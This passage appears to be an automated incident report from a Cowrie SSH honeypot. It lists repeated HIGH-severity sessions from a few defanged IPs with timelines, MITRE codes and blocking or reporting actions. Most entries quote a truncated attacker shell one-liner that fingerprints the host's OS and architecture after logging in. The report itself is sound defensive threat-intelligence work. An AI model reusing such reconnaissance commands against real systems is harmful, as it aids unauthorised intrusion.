| `2026-07-05 06:03:48` | `cowrie.client.kex` |
| `2026-07-05 06:03:52` | `cowrie.login.success` |
| `2026-07-05 06:03:55` | `cowrie.session.params` |
| `2026-07-05 06:03:55` | `cowrie.command.input` |
| `2026-07-05 06:03:55` | `cowrie.command.input` |
| `2026-07-05 06:03:55` | `cowrie.command.input` |
| `2026-07-05 06:03:55` | `cowrie.command.input` |
| `2026-07-05 06:03:55` | `cowrie.command.input` |
| `2026-07-05 06:03:55` | `cowrie.command.success` |
| `2026-07-05 06:03:55` | `cowrie.command.input` |
| `2026-07-05 06:03:55` | `cowrie.command.input` |
| `2026-07-05 06:03:55` | `cowrie.command.input` |
| `2026-07-05 06:03:55` | `cowrie.command.input` |
| `2026-07-05 06:03:56` | `cowrie.log.closed` |
| `2026-07-05 06:03:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30d0903b38fd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 06:03 |
| **Last Seen** | 2026-07-05 06:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:03:56` | `cowrie.session.connect` |
| `2026-07-05 06:03:57` | `cowrie.client.version` |
| `2026-07-05 06:03:57` | `cowrie.client.kex` |
| `2026-07-05 06:04:01` | `cowrie.login.success` |
| `2026-07-05 06:04:02` | `cowrie.session.params` |
| `2026-07-05 06:04:02` | `cowrie.command.input` |
| `2026-07-05 06:04:02` | `cowrie.command.input` |
| `2026-07-05 06:04:02` | `cowrie.command.input` |
| `2026-07-05 06:04:02` | `cowrie.command.input` |
| `2026-07-05 06:04:02` | `cowrie.command.input` |
| `2026-07-05 06:04:02` | `cowrie.command.success` |
| `2026-07-05 06:04:02` | `cowrie.command.input` |
| `2026-07-05 06:04:02` | `cowrie.command.input` |
| `2026-07-05 06:04:02` | `cowrie.command.input` |
| `2026-07-05 06:04:02` | `cowrie.command.input` |
| `2026-07-05 06:04:04` | `cowrie.log.closed` |
| `2026-07-05 06:04:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5c879e91ccf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 06:05 |
| **Last Seen** | 2026-07-05 06:05 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:05:20` | `cowrie.session.connect` |
| `2026-07-05 06:05:21` | `cowrie.client.version` |
| `2026-07-05 06:05:21` | `cowrie.client.kex` |
| `2026-07-05 06:05:26` | `cowrie.login.success` |
| `2026-07-05 06:05:28` | `cowrie.session.params` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.success` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:30` | `cowrie.log.closed` |
| `2026-07-05 06:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6b9f589acbd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 06:05 |
| **Last Seen** | 2026-07-05 06:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:05:22` | `cowrie.session.connect` |
| `2026-07-05 06:05:24` | `cowrie.client.version` |
| `2026-07-05 06:05:24` | `cowrie.client.kex` |
| `2026-07-05 06:05:27` | `cowrie.login.success` |
| `2026-07-05 06:05:28` | `cowrie.session.params` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.success` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.command.input` |
| `2026-07-05 06:05:28` | `cowrie.log.closed` |
| `2026-07-05 06:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6f03504dcfe

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 06:06 |
| **Last Seen** | 2026-07-05 06:06 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:06:49` | `cowrie.session.connect` |
| `2026-07-05 06:06:50` | `cowrie.client.version` |
| `2026-07-05 06:06:50` | `cowrie.client.kex` |
| `2026-07-05 06:06:54` | `cowrie.login.success` |
| `2026-07-05 06:06:56` | `cowrie.session.params` |
| `2026-07-05 06:06:56` | `cowrie.command.input` |
| `2026-07-05 06:06:56` | `cowrie.command.input` |
| `2026-07-05 06:06:56` | `cowrie.command.input` |
| `2026-07-05 06:06:56` | `cowrie.command.input` |
| `2026-07-05 06:06:56` | `cowrie.command.input` |
| `2026-07-05 06:06:56` | `cowrie.command.success` |
| `2026-07-05 06:06:56` | `cowrie.command.input` |
| `2026-07-05 06:06:56` | `cowrie.command.input` |
| `2026-07-05 06:06:56` | `cowrie.command.input` |
| `2026-07-05 06:06:56` | `cowrie.command.input` |
| `2026-07-05 06:06:58` | `cowrie.log.closed` |
| `2026-07-05 06:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e178c879a53c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 06:06 |
| **Last Seen** | 2026-07-05 06:07 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:06:53` | `cowrie.session.connect` |
| `2026-07-05 06:06:54` | `cowrie.client.version` |
| `2026-07-05 06:06:54` | `cowrie.client.kex` |
| `2026-07-05 06:07:01` | `cowrie.login.success` |
| `2026-07-05 06:07:05` | `cowrie.session.params` |
| `2026-07-05 06:07:05` | `cowrie.command.input` |
| `2026-07-05 06:07:05` | `cowrie.command.input` |
| `2026-07-05 06:07:05` | `cowrie.command.input` |
| `2026-07-05 06:07:05` | `cowrie.command.input` |
| `2026-07-05 06:07:05` | `cowrie.command.input` |
| `2026-07-05 06:07:05` | `cowrie.command.success` |
| `2026-07-05 06:07:05` | `cowrie.command.input` |
| `2026-07-05 06:07:05` | `cowrie.command.input` |
| `2026-07-05 06:07:05` | `cowrie.command.input` |
| `2026-07-05 06:07:05` | `cowrie.command.input` |
| `2026-07-05 06:07:07` | `cowrie.log.closed` |
| `2026-07-05 06:07:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4480dd533333

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 06:08 |
| **Last Seen** | 2026-07-05 06:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:08:14` | `cowrie.session.connect` |
| `2026-07-05 06:08:15` | `cowrie.client.version` |
| `2026-07-05 06:08:15` | `cowrie.client.kex` |
| `2026-07-05 06:08:19` | `cowrie.login.success` |
| `2026-07-05 06:08:23` | `cowrie.session.params` |
| `2026-07-05 06:08:23` | `cowrie.command.input` |
| `2026-07-05 06:08:23` | `cowrie.command.input` |
| `2026-07-05 06:08:23` | `cowrie.command.input` |
| `2026-07-05 06:08:23` | `cowrie.command.input` |
| `2026-07-05 06:08:23` | `cowrie.command.input` |
| `2026-07-05 06:08:23` | `cowrie.command.success` |
| `2026-07-05 06:08:23` | `cowrie.command.input` |
| `2026-07-05 06:08:23` | `cowrie.command.input` |
| `2026-07-05 06:08:23` | `cowrie.command.input` |
| `2026-07-05 06:08:23` | `cowrie.command.input` |
| `2026-07-05 06:08:25` | `cowrie.log.closed` |
| `2026-07-05 06:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc2d30a1a364

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 06:08 |
| **Last Seen** | 2026-07-05 06:08 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:08:19` | `cowrie.session.connect` |
| `2026-07-05 06:08:20` | `cowrie.client.version` |
| `2026-07-05 06:08:20` | `cowrie.client.kex` |
| `2026-07-05 06:08:23` | `cowrie.login.success` |
| `2026-07-05 06:08:27` | `cowrie.session.params` |
| `2026-07-05 06:08:27` | `cowrie.command.input` |
| `2026-07-05 06:08:27` | `cowrie.command.input` |
| `2026-07-05 06:08:27` | `cowrie.command.input` |
| `2026-07-05 06:08:27` | `cowrie.command.input` |
| `2026-07-05 06:08:27` | `cowrie.command.input` |
| `2026-07-05 06:08:27` | `cowrie.command.success` |
| `2026-07-05 06:08:27` | `cowrie.command.input` |
| `2026-07-05 06:08:27` | `cowrie.command.input` |
| `2026-07-05 06:08:27` | `cowrie.command.input` |
| `2026-07-05 06:08:27` | `cowrie.command.input` |
| `2026-07-05 06:08:28` | `cowrie.log.closed` |
| `2026-07-05 06:08:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0c846c299a5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 06:09 |
| **Last Seen** | 2026-07-05 06:09 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:09:39` | `cowrie.session.connect` |
| `2026-07-05 06:09:40` | `cowrie.client.version` |
| `2026-07-05 06:09:40` | `cowrie.client.kex` |
| `2026-07-05 06:09:43` | `cowrie.login.success` |
| `2026-07-05 06:09:46` | `cowrie.session.params` |
| `2026-07-05 06:09:46` | `cowrie.command.input` |
| `2026-07-05 06:09:46` | `cowrie.command.input` |
| `2026-07-05 06:09:46` | `cowrie.command.input` |
| `2026-07-05 06:09:46` | `cowrie.command.input` |
| `2026-07-05 06:09:46` | `cowrie.command.input` |
| `2026-07-05 06:09:46` | `cowrie.command.success` |
| `2026-07-05 06:09:46` | `cowrie.command.input` |
| `2026-07-05 06:09:46` | `cowrie.command.input` |
| `2026-07-05 06:09:46` | `cowrie.command.input` |
| `2026-07-05 06:09:46` | `cowrie.command.input` |
| `2026-07-05 06:09:48` | `cowrie.log.closed` |
| `2026-07-05 06:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d5bd5b7e191

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 06:09 |
| **Last Seen** | 2026-07-05 06:09 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:09:41` | `cowrie.session.connect` |
| `2026-07-05 06:09:42` | `cowrie.client.version` |
| `2026-07-05 06:09:42` | `cowrie.client.kex` |
| `2026-07-05 06:09:47` | `cowrie.login.success` |
| `2026-07-05 06:09:50` | `cowrie.session.params` |
| `2026-07-05 06:09:50` | `cowrie.command.input` |
| `2026-07-05 06:09:50` | `cowrie.command.input` |
| `2026-07-05 06:09:50` | `cowrie.command.input` |
| `2026-07-05 06:09:50` | `cowrie.command.input` |
| `2026-07-05 06:09:50` | `cowrie.command.input` |
| `2026-07-05 06:09:50` | `cowrie.command.success` |
| `2026-07-05 06:09:50` | `cowrie.command.input` |
| `2026-07-05 06:09:50` | `cowrie.command.input` |
| `2026-07-05 06:09:50` | `cowrie.command.input` |
| `2026-07-05 06:09:50` | `cowrie.command.input` |
| `2026-07-05 06:09:51` | `cowrie.log.closed` |
| `2026-07-05 06:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-195af97f7ee0

| Field | Detail |
|---|---|
| **Source IP** | `207.175.73[.]73` |
| **First Seen** | 2026-07-05 06:11 |
| **Last Seen** | 2026-07-05 06:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:11:01` | `cowrie.session.connect` |
| `2026-07-05 06:11:01` | `cowrie.login.success` |
| `2026-07-05 06:11:01` | `cowrie.session.params` |
| `2026-07-05 06:11:01` | `cowrie.command.input` |
| `2026-07-05 06:11:01` | `cowrie.command.input` |
| `2026-07-05 06:11:01` | `cowrie.command.failed` |
| `2026-07-05 06:11:01` | `cowrie.command.input` |
| `2026-07-05 06:11:01` | `cowrie.log.closed` |
| `2026-07-05 06:11:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.73[.]73` to AbuseIPDB if not already reported
- [ ] Block `207.175.73[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d7ca21841c1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 06:11 |
| **Last Seen** | 2026-07-05 06:11 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:11:04` | `cowrie.session.connect` |
| `2026-07-05 06:11:05` | `cowrie.client.version` |
| `2026-07-05 06:11:05` | `cowrie.client.kex` |
| `2026-07-05 06:11:10` | `cowrie.login.success` |
| `2026-07-05 06:11:14` | `cowrie.session.params` |
| `2026-07-05 06:11:14` | `cowrie.command.input` |
| `2026-07-05 06:11:14` | `cowrie.command.input` |
| `2026-07-05 06:11:14` | `cowrie.command.input` |
| `2026-07-05 06:11:14` | `cowrie.command.input` |
| `2026-07-05 06:11:14` | `cowrie.command.input` |
| `2026-07-05 06:11:14` | `cowrie.command.success` |
| `2026-07-05 06:11:14` | `cowrie.command.input` |
| `2026-07-05 06:11:14` | `cowrie.command.input` |
| `2026-07-05 06:11:14` | `cowrie.command.input` |
| `2026-07-05 06:11:14` | `cowrie.command.input` |
| `2026-07-05 06:11:15` | `cowrie.log.closed` |
| `2026-07-05 06:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b691ecb00e73

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 06:11 |
| **Last Seen** | 2026-07-05 06:11 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:11:04` | `cowrie.session.connect` |
| `2026-07-05 06:11:04` | `cowrie.client.version` |
| `2026-07-05 06:11:04` | `cowrie.client.kex` |
| `2026-07-05 06:11:09` | `cowrie.login.success` |
| `2026-07-05 06:11:12` | `cowrie.session.params` |
| `2026-07-05 06:11:12` | `cowrie.command.input` |
| `2026-07-05 06:11:12` | `cowrie.command.input` |
| `2026-07-05 06:11:12` | `cowrie.command.input` |
| `2026-07-05 06:11:12` | `cowrie.command.input` |
| `2026-07-05 06:11:12` | `cowrie.command.input` |
| `2026-07-05 06:11:12` | `cowrie.command.success` |
| `2026-07-05 06:11:12` | `cowrie.command.input` |
| `2026-07-05 06:11:12` | `cowrie.command.input` |
| `2026-07-05 06:11:12` | `cowrie.command.input` |
| `2026-07-05 06:11:12` | `cowrie.command.input` |
| `2026-07-05 06:11:13` | `cowrie.log.closed` |
| `2026-07-05 06:11:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1014b38996c2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 06:11 |
| **Last Seen** | 2026-07-05 06:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:11:05` | `cowrie.session.connect` |
| `2026-07-05 06:11:06` | `cowrie.client.version` |
